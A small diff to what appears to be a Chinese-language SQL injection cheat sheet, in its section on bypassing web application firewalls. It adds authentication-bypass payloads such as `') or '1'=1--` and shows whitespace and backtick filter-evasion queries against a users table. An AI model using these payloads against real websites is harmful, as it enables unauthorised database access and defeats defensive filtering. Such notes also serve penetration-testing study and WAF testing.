@@ -179,7 +179,8 @@ where table_schema=0xXXXXX
 WAF is a defender for web.  
 繞過手勢:  
 - 萬能密鑰繞過  
-  - `id=1' or 1 like 1`  
+  - `id=1' or 1 like 1#`  
+  - `') or '1'=1--`  
 - 空白繞過  
   - `select/**/username/**/from/**/users;`  
   - `select@{反引號}id{反引號}`  
